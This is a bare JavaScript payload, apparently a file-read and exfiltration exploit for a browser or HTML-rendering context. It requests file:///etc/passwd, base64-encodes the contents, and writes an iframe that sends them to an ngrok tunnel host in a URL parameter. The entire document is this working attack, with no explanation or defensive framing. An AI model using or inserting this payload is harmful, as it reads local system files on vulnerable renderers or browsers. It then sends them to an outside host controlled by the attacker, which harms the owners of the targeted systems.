function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write('<iframe src="http://853d-111-94-9-137.ngrok.io?data='+b64+'"></iframe>');
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///etc/passwd"); 
oReq.send();
